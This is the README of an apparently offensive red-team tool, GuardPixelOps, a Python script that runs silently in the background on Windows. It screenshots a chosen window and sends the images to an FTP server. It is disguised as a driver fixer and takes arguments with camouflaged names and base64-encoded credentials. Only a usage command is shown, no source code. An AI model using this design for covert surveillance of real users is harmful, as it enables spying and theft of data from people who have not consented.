

### GuardPixelOps 🖥️🛡️

## Overview
GuardPixelOps is a powerful tool designed for Red Team operations and adversary simulations. This Python script focuses on Windows environments, specifically addressing issues sending screenshots. The tool offers functionalities for capturing screenshots and insecurely sending logs to a designated FTP server.

## Features
- **Automated Driver Fixes:** GuardPixelOps identifies and fixes broken drivers in the Windows environment. OF COURSE NOT! This is a joke!
- **Screenshot Capture:** The tool captures screenshots of the active window when a broken driver is detected, providing visual context for analysis. (You kidding me?! It takes screenshots based on the active Window!)
- **Secure Log Transmission:** Logs containing information are insecurely compressed and sent to a specified FTP server for analysis.
- **Background Operation:** GuardPixelOps operates silently in the background, periodically sending logs at regular intervals.

## How It Works
1. **Screenshot Grabbing:** Monitors the active window and captures screenshots when a specified window title is detected. The tool then saves the screenshots and logs the fixed driver information.
2. **Log Transmission:** Compresses the fixed driver logs into a zip file and securely transmits them to a designated FTP server for further analysis.
3. **Background Operation:** Runs as a background process, automatically sending logs at regular intervals.

## Usage
To use GuardPixelOps, provide the following command-line arguments:
- `--winupdate`: FTP Relay information. BASE64 Encoded! 🖥️
- `--wintoken`: Authentication User. BASE64 Encoded! 🖥️
- `--winversion`: Credentials. BASE64 Encoded! 🖥️
- `--regger`: Desired Window name. Plain Text

### Example Command:
```bash
python guardpixelops.py --winupdate <FTP_Relay_information> --wintoken <Authentication_User> --winversion <Credentials> --regger <Desired_Window_name>
```

## Setup
1. Clone the repository: `git clone https://github.com/your-username/guardpixelops.git`
2. Install dependencies: `pip install -r requirements.txt`
3. Run the script: `python guardpixelops.py`

## Disclaimer
GuardPixelOps is intended for educational and research purposes only. Users are responsible for complying with applicable laws and regulations.


Feel free to contribute to the project by opening issues or submitting pull requests!

👾 Happy Red Teaming with GuardPixelOps! 👾
